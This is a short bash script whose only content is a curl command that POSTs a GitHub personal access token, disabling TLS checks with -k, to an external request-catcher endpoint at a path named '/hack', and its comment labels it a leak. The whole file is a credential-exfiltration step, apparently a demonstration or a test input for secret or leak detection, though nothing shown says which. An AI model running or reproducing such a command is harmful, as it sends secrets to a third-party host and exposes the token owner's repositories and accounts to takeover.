#!/bin/bash

# Sending a POST request with a GitHub token (LEAK)
curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
  -H "Content-Type: application/json" \
  -d '{
    "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
  }'
